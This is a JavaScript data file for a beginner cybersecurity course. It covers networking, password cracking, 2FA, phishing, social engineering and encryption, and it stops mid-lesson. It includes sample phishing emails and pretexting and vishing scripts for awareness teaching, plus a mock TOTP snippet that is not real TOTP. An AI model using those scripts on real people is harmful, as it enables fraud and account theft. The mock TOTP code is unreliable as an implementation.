export const courseData = {
  title: "Cybersecurity",
  subtitle: "Learn to protect yourself and hack ethically",
  chapters: [
    {
      id: 1,
      title: "Welcome to Cybersecurity",
      description: "What hackers do and why it matters",
      lessons: [
        {
          id: "1-1",
          title: "What is Cybersecurity?",
          duration: "8 min",
          content: `
## Welcome, Future Cyber Defender! 🛡️

Every day, hackers attack millions of computers, phones, and websites. **Cybersecurity** is the art of defending against these attacks — and understanding how they work.

### Why Should You Care?

Think about everything connected to the internet:
- Your phone 📱
- Your gaming console 🎮
- Smart TVs, cameras, doorbells 📷
- Cars, hospitals, power plants ⚡

ALL of these can be hacked. And someone needs to protect them.

### The Three Types of Hackers

| Type | Also Called | What They Do |
|------|-----------|-------------|
| **White Hat** | Ethical Hacker | Gets paid to find & fix security holes |
| **Black Hat** | Criminal Hacker | Breaks into systems illegally |
| **Gray Hat** | Somewhere in between | Finds bugs without permission, but reports them |

### What You'll Learn

In this course, you'll think like a hacker (the good kind!):

✅ How passwords get cracked
✅ How websites get hacked
✅ How to spot phishing scams
✅ How to protect your accounts
✅ How encryption works
✅ How to analyze network traffic
✅ Real hacking tools (used ethically!)

### The CIA Triad

The foundation of all cybersecurity:

- **C**onfidentiality — Only authorized people see the data
- **I**ntegrity — Data hasn't been tampered with
- **A**vailability — Systems are up and running when needed

\`\`\`
       Confidentiality
           /\\
          /  \\
         /    \\
        /  CIA  \\
       /________\\
  Integrity    Availability
\`\`\`

Every security decision balances these three goals.

### Real-World Cyber Attacks

| Attack | Year | What Happened |
|--------|------|--------------|
| Yahoo Breach | 2013 | 3 billion accounts stolen |
| WannaCry | 2017 | Ransomware hit 200,000 computers |
| SolarWinds | 2020 | Hackers infiltrated US government |
| Colonial Pipeline | 2021 | Shut down fuel supply for days |

<tip>
💡 Cybersecurity jobs pay $80,000-$200,000+ and there's a massive shortage of skilled workers!
</tip>

### The Golden Rule

**Never hack anything you don't have permission to hack.**

This course teaches you skills for defense and ethical hacking ONLY. Using these skills illegally can land you in serious trouble.

### Defense in Depth

Professional security uses **multiple layers** of protection:

\`\`\`
Layer 1: Physical Security    → Locks, badges, cameras
Layer 2: Network Security     → Firewalls, IDS/IPS
Layer 3: Endpoint Security    → Antivirus, patching
Layer 4: Application Security → Input validation, auth
Layer 5: Data Security        → Encryption, backups
Layer 6: Human Security       → Training, awareness
\`\`\`

If one layer fails, the others still protect you. This is why we don't rely on just passwords or just firewalls — we use everything together.

### Common Attack Categories

\`\`\`
PASSIVE ATTACKS (listening):
├── Eavesdropping (sniffing network traffic)
├── Traffic analysis (who's talking to whom)
└── Keylogging (recording keystrokes)

ACTIVE ATTACKS (interfering):
├── Man-in-the-Middle (intercepting communications)
├── Denial of Service (flooding with traffic)
├── SQL Injection (attacking databases)
├── Phishing (fake emails/websites)
└── Ransomware (encrypting files for ransom)
\`\`\`

### Cybersecurity Career Paths

\`\`\`
Entry Level:
  Security Analyst       → $60-90K
  SOC Analyst            → $55-85K
  IT Auditor             → $60-90K

Mid Level:
  Penetration Tester     → $80-130K
  Security Engineer      → $90-140K
  Incident Responder     → $85-130K

Senior Level:
  Security Architect     → $130-200K
  CISO                   → $150-300K
  Red Team Lead          → $120-180K
\`\`\`

### Key Certifications

| Certification | Level | Focus |
|--------------|-------|-------|
| CompTIA Security+ | Entry | General security |
| CEH | Intermediate | Ethical hacking |
| OSCP | Advanced | Penetration testing |
| CISSP | Senior | Security management |

Ready to become a cyber defender? Let's go! 🚀
          `
        },
        {
          id: "1-2",
          title: "How the Internet Actually Works",
          duration: "10 min",
          content: `
## Under the Hood of the Internet 🌐

To defend the internet, you need to understand how it works!

### IP Addresses — Your Digital Address

Every device on the internet has an **IP address**:

\`\`\`
Your computer:  192.168.1.100  (private/local)
Google's server: 142.250.80.46  (public)
\`\`\`

**IPv4**: 4 numbers, 0-255 each → \`192.168.1.1\`
**IPv6**: Longer, newer format → \`2001:0db8:85a3::8a2e:0370:7334\`

### DNS — The Internet's Phone Book

When you type \`google.com\`, your computer asks a **DNS server**: "What's the IP for google.com?"

\`\`\`
You → "What IP is google.com?"
DNS → "It's 142.250.80.46"
You → connects to 142.250.80.46
\`\`\`

\`\`\`bash
# Try it yourself! Open terminal and type:
nslookup google.com

# Or:
ping google.com
\`\`\`

### Ports — Doors Into a Computer

Each computer has **65,535 ports**. Think of them as doors:

| Port | Service | What It Does |
|------|---------|-------------|
| 80 | HTTP | Regular websites |
| 443 | HTTPS | Secure websites |
| 22 | SSH | Remote access |
| 25 | SMTP | Email sending |
| 3306 | MySQL | Databases |

<warning>
⚠️ Open ports are like unlocked doors — hackers scan for them!
</warning>

### HTTP vs HTTPS

\`\`\`
HTTP  = Sending a postcard (anyone can read it)
HTTPS = Sending a sealed letter (encrypted!)
\`\`\`

Always check for the 🔒 lock icon in your browser!

### Packets — How Data Travels

Data doesn't travel as one big file. It's broken into **packets**:

\`\`\`
Your message: "Hello World!"

Split into packets:
[Packet 1] "Hel" → Route A → ✓
[Packet 2] "lo "  → Route B → ✓
[Packet 3] "Wor" → Route A → ✓
[Packet 4] "ld!" → Route C → ✓

Reassembled: "Hello World!"
\`\`\`

Each packet contains:
- **Source IP** — Where it came from
- **Destination IP** — Where it's going
- **Data** — The actual content
- **Checksum** — Verify it wasn't corrupted

### The OSI Model (Simplified)

\`\`\`
7. Application  ← You interact here (browser, email)
6. Presentation ← Data formatting (encryption)
5. Session      ← Connection management
4. Transport    ← TCP/UDP (reliable delivery)
3. Network      ← IP addresses, routing
2. Data Link    ← MAC addresses, switches
1. Physical     ← Cables, Wi-Fi signals
\`\`\`

<tip>
💡 Hackers can attack at ANY layer. That's why security needs to cover all of them!
</tip>

### Try It: See Your Network Info

\`\`\`bash
# Windows
ipconfig

# Mac/Linux
ifconfig
# or
ip addr

# See your public IP
curl ifconfig.me
\`\`\`

### TCP vs UDP

Two main protocols for sending data:

\`\`\`
TCP (Transmission Control Protocol):
├── Reliable — guarantees delivery
├── Ordered — packets arrive in sequence
├── Handshake — connection established first
├── Used for: Web, email, file transfers
└── Analogy: Registered mail (tracked, confirmed)

UDP (User Datagram Protocol):
├── Fast — no handshake needed
├── Unreliable — packets might get lost
├── Unordered — packets may arrive out of order
├── Used for: Gaming, video streaming, DNS
└── Analogy: Throwing a paper airplane (fast, no guarantee)
\`\`\`

### The TCP Three-Way Handshake

\`\`\`
Client → SYN      → Server   "Hey, want to connect?"
Client ← SYN-ACK ← Server   "Sure! Ready when you are."
Client → ACK      → Server   "Great, let's go!"
         [Connection established!]
\`\`\`

<tip>
💡 A SYN Flood attack sends millions of SYN packets but never completes the handshake — overwhelming the server with half-open connections!
</tip>

### Traceroute — Follow the Path

See every router your data passes through:

\`\`\`bash
# Windows
tracert google.com

# Mac/Linux  
traceroute google.com

# Example output:
1  router.local (192.168.1.1)     1 ms
2  isp-gateway (10.0.0.1)         8 ms
3  backbone.net (72.14.232.1)    15 ms
4  google.com (142.250.80.46)    20 ms
\`\`\`

Each "hop" is a router between you and the destination. More hops = more potential attack points!

### ARP — Address Resolution Protocol

ARP links IP addresses to physical MAC addresses on your local network:

\`\`\`bash
# See your ARP table:
arp -a

# Output:
# 192.168.1.1   →  aa:bb:cc:dd:ee:ff  (your router)
# 192.168.1.50  →  11:22:33:44:55:66  (another device)
\`\`\`

<warning>
⚠️ ARP Spoofing is a common attack where a hacker sends fake ARP messages to redirect traffic through their machine!
</warning>

Understanding networking is the foundation of cybersecurity! 🎯
          `
        }
      ]
    },
    {
      id: 2,
      title: "Passwords & Authentication",
      description: "How passwords get cracked and how to stay safe",
      lessons: [
        {
          id: "2-1",
          title: "How Passwords Get Cracked",
          duration: "12 min",
          content: `
## Password Cracking 101 🔓

Passwords are the #1 way we protect accounts. And the #1 thing hackers target.

### How Passwords Are Stored

Websites DON'T store your actual password (usually). They store a **hash**:

\`\`\`
Your password: "minecraft123"
        ↓ Hash Function (SHA-256)
Stored hash: "a1b2c3d4e5f6789..."
\`\`\`

A hash is a one-way function — you can't reverse it to get the password back.

\`\`\`python
# Python example of hashing
import hashlib

password = "minecraft123"
hashed = hashlib.sha256(password.encode()).hexdigest()
print(hashed)
# Output: a1b2c3d4e5f6... (always the same for same input!)
\`\`\`

### Attack #1: Brute Force

Try EVERY possible combination:

\`\`\`
Trying: a        ✗
Trying: b        ✗
Trying: c        ✗
...
Trying: aa       ✗
Trying: ab       ✗
...
(This takes forever for long passwords!)
\`\`\`

| Password Length | Possible Combos | Time to Crack |
|----------------|----------------|--------------|
| 4 characters | 14 million | Instant |
| 6 characters | 19 billion | Seconds |
| 8 characters | 6 trillion | Hours |
| 12 characters | 95 sextillion | Centuries |
| 16 characters | ... | Heat death of universe |

### Attack #2: Dictionary Attack

Use a list of common passwords:

\`\`\`
password       ✗
123456         ✗
qwerty         ✗
minecraft123   ✓ FOUND!
\`\`\`

### The Most Common Passwords (DON'T use these!)

1. 123456
2. password
3. 123456789
4. qwerty
5. abc123
6. password1
7. iloveyou
8. 12345678

<warning>
⚠️ If your password is on this list, change it RIGHT NOW!
</warning>

### Attack #3: Rainbow Tables

Pre-computed hashes for millions of passwords:

\`\`\`
"password"    → 5e884898da28047...
"123456"      → 8d969eef6ecad3c...
"minecraft"   → 7c9e7c1b2d4f8a1...
\`\`\`

Hackers just look up the hash! That's why websites use **salting**:

\`\`\`
password + random_salt → unique_hash
"minecraft" + "x7k2" → "completely_different_hash"
"minecraft" + "p9m1" → "another_different_hash"
\`\`\`

Same password, different salt = different hash. Rainbow tables become useless!

### Attack #4: Credential Stuffing

1. Hacker gets leaked passwords from Site A
2. Tries same email/password on Site B, C, D...
3. People reuse passwords → accounts get hacked

<tip>
💡 This is why you should NEVER reuse passwords across different sites!
</tip>

### How to Make Strong Passwords

**Bad:** \`minecraft123\` (dictionary word + numbers)
**Better:** \`M!n3cr@ft_2024!\` (substitutions)
**Best:** \`correct-horse-battery-staple\` (passphrase!)

Passphrases are:
- Easy to remember
- Hard to crack
- Long = more secure

\`\`\`
4 random words = 20+ characters = extremely secure
"purple-elephant-dancing-tuesday"
\`\`\`

### Attack #5: Credential Stuffing

Using stolen username/password pairs from data breaches on OTHER sites:

\`\`\`
Data breach: LinkedIn passwords leaked (2016)
Hacker gets: john@email.com : MyPass123

Tries the SAME credentials on:
├── Gmail       → ✓ WORKS (same password!)
├── Facebook    → ✓ WORKS
├── Amazon      → ✓ WORKS
└── Bank        → ✓ WORKS (catastrophic!)
\`\`\`

This is why you should NEVER reuse passwords!

### Salting — The Defense Against Rainbow Tables

\`\`\`
WITHOUT SALT:
"password123" → always produces the same hash
Hacker pre-computes: hash → password (rainbow table)

WITH SALT:
"password123" + "x7kJ9m" → unique hash #1
"password123" + "pQ3nR2" → completely different hash #2

Same password, different salts = different hashes!
Now rainbow tables are useless because every hash is unique.
\`\`\`

\`\`\`python
# Proper password hashing with salt (bcrypt)
import bcrypt

password = b"MySecurePassword123"

# Generate salt and hash
salt = bcrypt.gensalt()
hashed = bcrypt.hashpw(password, salt)
print(f"Salt: {salt}")
print(f"Hash: {hashed}")

# Verify a password
if bcrypt.checkpw(password, hashed):
    print("Password matches!")
\`\`\`

### Check If You've Been Breached

\`\`\`
Go to: haveibeenpwned.com
Enter your email address
See which data breaches include your info!

If you're in a breach:
1. Change that password IMMEDIATELY
2. Change it on any other site where you used it
3. Enable 2FA on the breached account
4. Monitor for suspicious activity
\`\`\`

<warning>
⚠️ The average person's email appears in 2-3 data breaches. Check yours now!
</warning>

### Password Strength Calculator

\`\`\`python
import math
import string

def calculate_strength(password):
    """Calculate password entropy in bits."""
    charset_size = 0
    if any(c in string.ascii_lowercase for c in password):
        charset_size += 26
    if any(c in string.ascii_uppercase for c in password):
        charset_size += 26
    if any(c in string.digits for c in password):
        charset_size += 10
    if any(c in string.punctuation for c in password):
        charset_size += 32
    
    entropy = len(password) * math.log2(charset_size)
    
    if entropy < 28:
        strength = "VERY WEAK"
    elif entropy < 36:
        strength = "WEAK"
    elif entropy < 60:
        strength = "MODERATE"
    elif entropy < 80:
        strength = "STRONG"
    else:
        strength = "VERY STRONG"
    
    return entropy, strength

bits, rating = calculate_strength("P@ssw0rd123!")
print(f"Entropy: {bits:.0f} bits — {rating}")
\`\`\`

You now understand how hackers crack passwords! 🎓
          `
        },
        {
          id: "2-2",
          title: "Two-Factor Authentication",
          duration: "8 min",
          content: `
## The Extra Lock on Your Door 🔐

Even the strongest password can be stolen. That's where **2FA** comes in!

### What is 2FA?

Two-Factor Authentication requires TWO things to log in:

\`\`\`
Factor 1: Something you KNOW (password)
    +
Factor 2: Something you HAVE (phone/key)
    =
Much harder to hack!
\`\`\`

### Types of 2FA

| Method | Security | Convenience |
|--------|----------|------------|
| SMS Code | ⭐⭐ | ⭐⭐⭐⭐⭐ |
| Authenticator App | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| Hardware Key (YubiKey) | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ |
| Biometric (fingerprint) | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |

### Why SMS 2FA is Weak

**SIM Swapping Attack:**
1. Hacker calls your phone carrier
2. Pretends to be you
3. Transfers your number to their SIM
4. Now THEY get your SMS codes!

\`\`\`
Hacker: "Hi, I lost my phone. Can you transfer 
         my number to this new SIM?"
Carrier: "Sure! What's your mother's maiden name?"
Hacker: (found it on social media) "Smith"
Carrier: "Done!"
Your 2FA codes: → Hacker's phone 😱
\`\`\`

### Authenticator Apps (Recommended!)

Apps like **Google Authenticator** or **Authy** generate codes that change every 30 seconds:

\`\`\`
Your app shows: 847 291
                ████████░░ (25 seconds left)

After 30 seconds: 163 502
                  ██░░░░░░░░ (new code!)
\`\`\`

### How TOTP Works

\`\`\`
Secret Key (shared once) + Current Time
        ↓
    HMAC Algorithm
        ↓
    6-digit code
\`\`\`

\`\`\`python
# Simplified TOTP concept
import time
import hashlib

secret = "JBSWY3DPEHPK3PXP"
time_step = int(time.time() / 30)  # Changes every 30 sec
code = hashlib.sha1(f"{secret}{time_step}".encode()).hexdigest()[-6:]
print(f"Your code: {code}")
\`\`\`

### Hardware Security Keys

Physical USB keys (like YubiKey):
- Plug in and tap to authenticate
- **Impossible** to phish remotely
- Used by Google employees (zero phishing since adoption!)

### Set Up 2FA NOW!

Priority accounts to protect:
1. **Email** (password reset for everything!)
2. **Banking/Financial**
3. **Social Media**
4. **Gaming accounts** (Steam, etc.)

<tip>
💡 Always save your **backup codes** when setting up 2FA! Store them somewhere safe offline.
</tip>

### Password Managers

Use one to generate and store unique passwords:
- **Bitwarden** (free, open source)
- **1Password** (paid, great UI)
- **KeePass** (free, local only)

\`\`\`
Without manager: Same password everywhere 😰
With manager: Unique 24-char password per site 💪
\`\`\`

You only need to remember ONE master password!

Enable 2FA on everything. It's the single best thing you can do for security! 🔐
          `
        }
      ]
    },
    {
      id: 3,
      title: "Social Engineering",
      description: "Hacking the human mind",
      lessons: [
        {
          id: "3-1",
          title: "Phishing Attacks",
          duration: "10 min",
          content: `
## The Art of Deception 🎣

The easiest way to hack someone? **Ask them for their password.** Seriously.

### What is Phishing?

Fake emails/messages that trick you into giving up information:

\`\`\`
From: security@amaz0n.com  ← Notice the ZERO!
Subject: Your account has been compromised!

Dear Customer,

We detected suspicious activity. Click here to 
verify your identity immediately or your account 
will be suspended in 24 hours!

[VERIFY NOW] ← Links to fake-amazon-login.com
\`\`\`

### Spot the Red Flags 🚩

1. **Urgency** — "Act NOW or else!"
2. **Fear** — "Your account is compromised!"
3. **Bad sender** — \`security@amaz0n.com\` (not amazon.com)
4. **Suspicious links** — Hover before clicking!
5. **Grammar errors** — "Dear Valued Customers"
6. **Generic greeting** — "Dear Customer" not your name
7. **Too good to be true** — "You won $1,000,000!"

### Types of Phishing

| Type | Target | Example |
|------|--------|---------|
| **Phishing** | Anyone | Mass fake emails |
| **Spear Phishing** | Specific person | Researched, personalized |
| **Whaling** | CEO/executives | High-value targets |
| **Smishing** | Via SMS | "Your package is delayed" |
| **Vishing** | Via phone call | "This is the IRS..." |

### Real Phishing Examples

**Fake Login Page:**
\`\`\`
Real:  https://accounts.google.com/login
Fake:  https://accounts.g00gle.com/login  ← zeros!
Fake:  https://google-accounts-login.com  ← wrong domain!
Fake:  https://accounts.google.com.evil.com/login ← subdomain trick!
\`\`\`

**URL Anatomy:**
\`\`\`
https://accounts.google.com.evil.com/login
         ↑                    ↑
    looks legit          ACTUAL domain is evil.com!
\`\`\`

<warning>
⚠️ Always check the ACTUAL domain — it's the part right before .com/.org/.net!
</warning>

### How to Check a Suspicious Email

\`\`\`
1. Don't click any links!
2. Check the sender's FULL email address
3. Hover over links to see real URL
4. Look for urgency/fear tactics
5. When in doubt, go directly to the website
   (type it yourself, don't click the link)
\`\`\`

### Phishing Quiz

Which URL is real?

\`\`\`
A) https://www.paypal.com/login
B) https://www.paypa1.com/login
C) https://paypal.secure-login.com
D) https://www.paypal.com.verify.net/login
\`\`\`

Answer: **A** — it's the only one with the real paypal.com domain!

<tip>
💡 When in doubt, NEVER click email links. Open your browser and type the website address yourself!
</tip>

### Social Media Phishing

Hackers use info from your profiles to make convincing attacks:

\`\`\`
Public info they find:
- Your school name
- Your pet's name
- Your birthday
- Your friends list
- Where you work

They use this to:
- Guess security questions
- Create targeted phishing
- Impersonate your friends
\`\`\`

### Checking Links Safely

\`\`\`
BEFORE CLICKING any link:

1. HOVER over it to see the real URL
   Display: "Click to verify your account"
   Real URL: http://faceb00k-verify.suspicious.com
                     ^^^^^^ NOT facebook.com!

2. Check the domain carefully:
   ✅ facebook.com
   ✅ login.facebook.com (subdomain of facebook.com)
   ❌ facebook.suspicious.com (subdomain of suspicious.com!)
   ❌ facebo0k.com (zero instead of 'o')
   ❌ facebook-login.com (totally different domain)

3. Use VirusTotal to scan suspicious links:
   virustotal.com — paste the URL, it scans with 70+ antivirus engines
\`\`\`

### URL Anatomy for Security

\`\`\`
https://www.example.com:443/path/page?query=value#section
  │       │     │        │    │    │       │         │
  │       │     │        │    │    │       │         └── Fragment
  │       │     │        │    │    │       └── Query string
  │       │     │        │    │    └── Page
  │       │     │        │    └── Path
  │       │     │        └── Port (443 = HTTPS default)
  │       │     └── Domain (THIS IS WHAT MATTERS!)
  │       └── Subdomain
  └── Protocol (https = secure)

RULE: Always check the DOMAIN, not the subdomain or path.
paypal.com/login       → Real PayPal ✅
login.paypal.com       → Real PayPal ✅
paypal.login.evil.com  → NOT PayPal! ❌ (domain is evil.com)
\`\`\`

### Email Header Analysis

\`\`\`
Most email clients let you view full headers:
Gmail: Open email → ⋮ → "Show original"

KEY HEADERS TO CHECK:
From: security@paypal.com        → Displayed sender (EASILY FAKED!)
Return-Path: attacker@evil.com   → Actual return address
Received: from mail.evil.com     → Actual sending server
SPF: FAIL                        → Sender not authorized!
DKIM: FAIL                       → Signature doesn't match!

If SPF or DKIM fail → likely phishing!
\`\`\`

\`\`\`python
# Python script to check if a domain has SPF/DKIM
import dns.resolver

def check_email_security(domain):
    """Check if a domain has email security records."""
    try:
        # Check SPF record
        spf = dns.resolver.resolve(domain, 'TXT')
        for record in spf:
            if 'spf' in str(record).lower():
                print(f"SPF found: {record}")
    except:
        print("No SPF record found! ⚠️")
    
    try:
        # Check DMARC record
        dmarc = dns.resolver.resolve(f'_dmarc.{domain}', 'TXT')
        for record in dmarc:
            print(f"DMARC found: {record}")
    except:
        print("No DMARC record found! ⚠️")

check_email_security("google.com")
\`\`\`

### Phishing Simulation Exercise

\`\`\`
Can you spot which emails are phishing? (Answers below)

EMAIL 1:
From: support@amazon.com
Subject: Your order #302-4857123 has shipped
"Hi John, your order will arrive Tuesday."
[Track Package]

EMAIL 2:
From: security@amaz0n-verify.com
Subject: URGENT: Verify your account NOW!
"Dear Customer, click below or lose access in 24h!"
[Verify Identity]

EMAIL 3:
From: hr@company.com
Subject: Updated PTO Policy
"Please review the new PTO policy document attached."
[Open PDF]

ANSWERS:
Email 1: ✅ Likely legitimate (uses your name, real domain)
Email 2: 🚩 PHISHING (fake domain, urgency, generic greeting)
Email 3: ⚠️ Could be either! Verify with HR directly.
\`\`\`

Stay skeptical! If something feels off, it probably is. 🎯
          `
        },
        {
          id: "3-2",
          title: "Social Engineering Tactics",
          duration: "10 min",
          content: `
## Hacking Without Code 🧠

**Social engineering** is manipulating people into breaking security. No code needed!

### The 6 Principles of Influence

Hackers exploit these psychological principles:

**1. Authority**
\`\`\`
"Hi, I'm from the IT department. I need your 
password to fix a critical issue."
→ People obey authority figures
\`\`\`

**2. Urgency**
\`\`\`
"Your account will be deleted in 1 HOUR unless 
you verify RIGHT NOW!"
→ Panic overrides critical thinking
\`\`\`

**3. Social Proof**
\`\`\`
"Everyone in your department has already updated 
their passwords using this link."
→ If others did it, it must be safe
\`\`\`

**4. Reciprocity**
\`\`\`
"I helped fix your computer last week, remember? 
I just need a small favor..."
→ We feel obligated to return favors
\`\`\`

**5. Liking**
\`\`\`
"Hey! We met at the conference, right? Great 
presentation! By the way..."
→ We trust people we like
\`\`\`

**6. Scarcity**
\`\`\`
"Only the first 10 people get free access! 
Click now before it's gone!"
→ Fear of missing out
\`\`\`

### Real Attack: Tailgating

Following someone through a locked door:

\`\`\`
*Employee badges into building*
Hacker: "Oh hey, can you hold the door? 
         My hands are full!" 📦
Employee: "Sure!"
Hacker: *walks right into secure building*
\`\`\`

### Real Attack: Pretexting

Creating a fake scenario:

\`\`\`
Hacker calls reception:
"Hi, I'm from Cisco doing a network audit. 
I need the admin password for router 
configuration check."

Receptionist: "Oh, let me ask... 
The admin password is 'cisco123'"
\`\`\`

### Real Attack: Baiting

Leaving infected USB drives in parking lots:

\`\`\`
*Employee finds USB labeled "Salary Data 2024"*
Employee: "Ooh, interesting!" *plugs it in*
USB: *installs malware* 😈
\`\`\`

<warning>
⚠️ NEVER plug in USB drives you find! They could contain malware that runs automatically.
</warning>

### Real Attack: Quid Pro Quo

\`\`\`
Hacker calls employees randomly:
"Hi, I'm tech support. Are you having 
any computer problems?"

Employee: "Actually, yes! My email is slow."

Hacker: "I can fix that! Just install this 
remote access tool and give me your login..."
\`\`\`

### Defense Strategies

\`\`\`
✅ Verify identity independently
   (Call them back on a known number)

✅ Never give passwords over phone/email
   (IT will NEVER ask for your password)

✅ Question urgency
   ("Let me verify this first")

✅ Be suspicious of unsolicited help

✅ Report suspicious contacts
\`\`\`

<tip>
💡 The best defense against social engineering is awareness. Now that you know these tricks, they're much less likely to work on you!
</tip>

### Try This: Social Engineering Awareness

Next time you get a suspicious email or message:
1. Identify which principle(s) of influence it uses
2. Find the red flags
3. Think about what the attacker wants

Practice makes you harder to hack! 🛡️

### Deepfakes & AI Social Engineering

\`\`\`
NEW THREAT: AI-powered social engineering

Voice Cloning:
  - 3 seconds of audio → convincing voice clone
  - "Hi, this is your boss. Transfer $50,000 to..."
  - Happened to a UK energy company ($243,000 stolen!)

Video Deepfakes:
  - Realistic fake video calls
  - CEO "appears" on Zoom asking for action
  - Hard to detect in real-time

AI-Written Phishing:
  - ChatGPT writes perfect English (no more grammar errors!)
  - Personalized at scale
  - Nearly impossible to spot by language alone

DEFENSE:
  ├── Verify voice/video requests through another channel
  ├── Use code words for sensitive operations
  ├── Be skeptical of urgent requests (even from "bosses")
  ├── Call back on a KNOWN number (not one provided)
  └── Multi-person approval for financial transfers
\`\`\`

### Physical Security Awareness

\`\`\`
PHYSICAL ATTACKS (often overlooked!):

Shoulder Surfing:
  Watching someone type their password
  Defense: Screen privacy filters, awareness

Dumpster Diving:
  Going through trash for sensitive documents
  Defense: Shred everything with sensitive info

Tailgating:
  Following authorized person through secure door
  Defense: Always verify, never hold door for strangers

Evil Maid Attack:
  Physical access to unattended laptop
  Defense: Full disk encryption, lock screen, never leave unattended

USB Drop Attack:
  "Found" USB drives with malware
  Defense: NEVER plug in unknown USB devices
\`\`\`

<warning>
⚠️ Physical security is the most overlooked attack vector. The fanciest firewall can't stop someone who walks through the front door!
</warning>

Practice makes you harder to hack! 🛡️
          `
        }
      ]
    },
    {
      id: 4,
      title: "Encryption & Cryptography",
      description: "The math that keeps secrets safe",
      lessons: [
        {
          id: "4-1",
          title: "Encryption Basics",
          duration: "12 min",
          content: `
## Secret Messages 🔐

Encryption turns readable text into unreadable gibberish — and back again!

### Plaintext vs Ciphertext

\`\`\`
Plaintext:  "HELLO WORLD"     (readable)
     ↓ Encrypt with key
Ciphertext: "KHOOR ZRUOG"     (gibberish)
     ↓ Decrypt with key
Plaintext:  "HELLO WORLD"     (readable again!)
\`\`\`

### Caesar Cipher (The Oldest Encryption)

Shift each letter by N positions:

\`\`\`
Key: Shift by 3

A → D    H → K
B → E    E → H
C → F    L → O
...      O → R

HELLO → KHOOR
\`\`\`

\`\`\`python
# Caesar Cipher in Python
def caesar_encrypt(text, shift):
    result = ""
    for char in text:
        if char.isalpha():
            base = ord('A') if char.isupper() else ord('a')
            result += chr((ord(char) - base + shift) % 26 + base)
        else:
            result += char
    return result

# Encrypt
secret = caesar_encrypt("HELLO WORLD", 3)
print(secret)  # KHOOR ZRUOG

# Decrypt (shift backwards)
original = caesar_encrypt(secret, -3)
print(original)  # HELLO WORLD
\`\`\`

### Why Caesar Cipher is Weak

Only 26 possible shifts — try them all!

\`\`\`
KHOOR → shift 1  → JGNNQ  ✗
KHOOR → shift 2  → IFMMP  ✗
KHOOR → shift 3  → HELLO  ✓ Found it!
\`\`\`

### Symmetric Encryption

Same key to encrypt AND decrypt:

\`\`\`
    Key: "mysecretkey"
         ↓
Alice ──[Encrypt]──→ Ciphertext ──[Decrypt]──→ Bob
         ↑                                      ↑
    Uses same key                          Uses same key
\`\`\`

Modern symmetric algorithms:
- **AES** (Advanced Encryption Standard) — The gold standard
- **ChaCha20** — Fast, used in HTTPS

### Asymmetric Encryption (Public Key)

TWO different keys — a public key and a private key:

\`\`\`
Bob has:
  🔑 Public Key  (shared with everyone)
  🗝️ Private Key (kept secret!)

Alice wants to send Bob a message:
  1. Alice encrypts with Bob's PUBLIC key
  2. Only Bob's PRIVATE key can decrypt it!
\`\`\`

\`\`\`
Alice: "Hey Bob!" 
  → Encrypt with Bob's 🔑 Public Key
  → "x8k2m9p..."
  → Send to Bob

Bob receives: "x8k2m9p..."
  → Decrypt with 🗝️ Private Key  
  → "Hey Bob!"

Hacker intercepts: "x8k2m9p..."
  → Has no private key
  → Can't decrypt! 🔒
\`\`\`

### Real-World Uses

| Where | Encryption Used |
|-------|----------------|
| HTTPS websites | TLS (asymmetric + symmetric) |
| WhatsApp | Signal Protocol (end-to-end) |
| Bitcoin | Elliptic Curve Cryptography |
| Wi-Fi (WPA3) | AES encryption |
| File storage | AES-256 |

<tip>
💡 When you see HTTPS, your browser and the server did an asymmetric key exchange, then switched to faster symmetric encryption for the actual data!
</tip>

### Hashing vs Encryption

\`\`\`
Encryption: Plaintext ←→ Ciphertext (reversible!)
Hashing:    Plaintext  →  Hash      (one-way only!)
\`\`\`

Hashing is used for passwords — the website never needs to get your password back, just check if it matches!

### Common Encryption Algorithms

\`\`\`
SYMMETRIC (same key encrypts/decrypts):
├── AES-256    → Gold standard, used everywhere
├── AES-128    → Slightly faster, still very secure
├── ChaCha20   → Fast on mobile, used by Google
└── (OLD) DES  → BROKEN, never use!

ASYMMETRIC (public/private key pair):
├── RSA-2048   → Most common, proven secure
├── RSA-4096   → Extra security, slower
├── Ed25519    → Modern, fast, smaller keys
└── ECDSA      → Used in Bitcoin, TLS

HASHING (one-way, for verification):
├── SHA-256    → Standard, used in Bitcoin
├── SHA-3      → Newest standard
├── bcrypt     → For passwords (slow = good!)
├── Argon2     → Best for passwords
└── (OLD) MD5  → BROKEN, never use for security!
\`\`\`

<warning>
⚠️ Never use MD5 or SHA-1 for security purposes — they have known collision vulnerabilities. Always use SHA-256 or better!
</warning>

### Digital Signatures

How do you know a message REALLY came from who it claims?

\`\`\`
SIGNING (sender):
Message → Hash → Encrypt hash with PRIVATE key → Signature

VERIFYING (receiver):
1. Decrypt signature with sender's PUBLIC key → Original hash
2. Hash the received message → New hash
3. Compare: Original hash == New hash?
   YES → Message is authentic and unmodified ✓
   NO  → Message was tampered with ✗
\`\`\`

\`\`\`python
# Conceptual digital signature
from hashlib import sha256

# Sender signs
message = "Send $100 to Alice"
message_hash = sha256(message.encode()).hexdigest()
signature = encrypt_with_private_key(message_hash)  # Only sender can do this

# Receiver verifies
received_hash = decrypt_with_public_key(signature)  # Anyone can verify
computed_hash = sha256(message.encode()).hexdigest()
is_authentic = received_hash == computed_hash
print(f"Message authentic: {is_authentic}")
\`\`\`

Understanding encryption is understanding the backbone of internet security! 🔐
          `
        },
        {
          id: "4-2",
          title: "HTTPS & Secure Communication",
          duration: "10 min",
          content: `
## How HTTPS Keeps You Safe 🔒

Every time you visit a website with 🔒, encryption is protecting you!

### The TLS Handshake

When you visit https://google.com:

\`\`\`
1. YOUR BROWSER → "Hello! I want a secure connection"
2. GOOGLE → "Here's my certificate + public key" 📜
3. YOUR BROWSER → Verifies certificate is legit
4. YOUR BROWSER → Generates a session key
5. YOUR BROWSER → Encrypts session key with Google's 
                  public key, sends it
6. GOOGLE → Decrypts with private key
7. BOTH → Now share the same session key!
8. ALL DATA → Encrypted with session key 🔒
\`\`\`

### Certificates — Proof of Identity

A certificate says: "I am really google.com"

\`\`\`
Certificate for: google.com
Issued by: Google Trust Services (CA)
Valid: Jan 2024 - Apr 2024
Public Key: [included]
Signature: [CA signed this]
\`\`\`

**Certificate Authorities (CAs)** are trusted organizations that verify identities. Your browser comes with a list of trusted CAs.

### What Happens Without HTTPS

On public Wi-Fi with HTTP:

\`\`\`
You → "My password is hunter2" → Wi-Fi → Website
                                   ↑
                              Hacker sees:
                         "My password is hunter2" 😱

With HTTPS:
